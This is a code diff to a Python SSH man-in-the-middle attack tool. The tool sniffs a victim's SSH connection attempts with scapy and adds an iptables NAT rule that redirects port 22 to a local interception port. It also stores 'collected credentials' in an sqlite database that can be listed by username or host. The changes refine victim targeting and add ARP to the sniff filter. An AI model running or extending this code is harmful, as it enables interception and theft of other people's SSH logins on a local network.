@@ -17,8 +17,10 @@ def process_packet(packet):
     """
     Callback called when a ssh packet has been sniffed
     """
-    if packet["TCP"].flags == 0x02: # checks if the packet has the SYN flag, meaning that a new connection is happening
-        set_remote_server_address(packet[0][1].dst)
+    if(packet.haslayer(TCP)):
+        if packet["IP"].src == target and packet["TCP"].flags == 0x02: # checks if the packet has the SYN flag, meaning that a new connection is happening
+            print("client is trying to connect to the server")
+            set_remote_server_address(packet[0][1].dst)
 
 # victim ip address
 target = "192.168.56.3"
@@ -45,8 +47,8 @@ def ssh_mitm(target,gateway,db_name,verbose):
         # bind the queue number to our callback `process_packet`
         # and start it
         os.system('iptables -v -t nat  -A PREROUTING -p tcp --destination-port 22 -j REDIRECT --to-port 2200')
-        packets_filter = f"port 22"
-        packets = sniff(filter=packets_filter, iface="eth0", prn=process_packet)
+        packets_filter = f"port 22 or arp"
+        packets = sniff(filter=packets_filter, prn=process_packet)
 
     except KeyboardInterrupt:
         pass
@@ -65,8 +67,8 @@ if __name__ == "__main__":
 
     parser.add_argument("-t", "--target",type=str,help="IP address of the victim machine, i.e. the machine that will try\
     to client to the remote SSH machine.")
-    parser.add_argument("-g", "--gateway",type=str,help="IP address of the gateway of the LAN")
-    parser.add_argument("-d", "--db",type=str,help="path of the sqlite3 database file")
+    parser.add_argument("-g", "--gateway",type=str,help="IP address of the gateway of the LAN or the IP address of a machine on the LAN that the victim will connect to")
+    parser.add_argument("-d", "--db",type=str,help="path to the sqlite3 database file")
     parser.add_argument("-l", "--list", action="store_true",help="show collected credentials instead of executing the attack")
     parser.add_argument("-u", "--username",type=str,help="filter the collected credentials by username")
     parser.add_argument("-s", "--sshmachine",type=str,help="filter the collected credentials by the IP address of the remote SSH machine")
